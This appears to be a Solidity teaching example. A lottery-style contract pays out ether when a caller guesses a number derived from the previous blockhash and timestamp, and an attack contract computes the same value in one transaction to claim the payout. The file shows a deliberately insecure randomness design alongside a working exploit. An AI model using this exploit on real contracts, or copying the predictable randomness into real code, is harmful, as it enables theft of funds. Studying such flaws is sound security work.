pragma solidity ^0.6.10;

contract GuessTheRandomNumber {

    event Log(bytes32 blockHash, uint ts);
    constructor() public payable {}

    function guess(uint _guess) public {
        uint answer = uint(keccak256(abi.encodePacked(
            blockhash(block.number - 1),
            block.timestamp
        )));

        emit Log(blockhash(block.number - 1), block.timestamp);

        if (_guess == answer) {
            (bool sent, ) = msg.sender.call{value: 1 ether}("");
            require(sent, "Failed to send Ether");
        }
    }
}

contract RandonAttack {

    event AttackLog(bytes32 blockHash, uint ts);
    fallback() external payable {}
    function attack(GuessTheRandomNumber guessTheRandomNumber) public {
        uint answer = uint(keccak256(abi.encodePacked(
            blockhash(block.number - 1),
            block.timestamp
        )));

        emit AttackLog(blockhash(block.number - 1), block.timestamp);

        guessTheRandomNumber.guess(answer);
    }
}